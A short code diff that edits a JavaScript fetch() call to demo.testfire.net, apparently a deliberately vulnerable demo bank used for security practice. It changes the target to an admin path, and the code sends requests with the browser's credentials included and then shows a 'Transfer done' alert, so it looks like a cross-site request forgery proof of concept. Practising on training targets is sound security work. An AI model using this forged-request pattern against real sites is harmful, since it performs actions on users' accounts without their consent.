@@ -1,4 +1,4 @@
-fetch("https://demo.testfire.net/admin/admin.jsp", {
+fetch("https://demo.testfire.net/admin/", {
   "headers": {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
     "accept-language": "en,en-US;q=0.9",
@@ -20,6 +20,5 @@ fetch("https://demo.testfire.net/admin/admin.jsp", {
   "mode": "cors",
   "credentials": "include"
 }).then(()=>{
-    
     alert("Transfer done")
 });
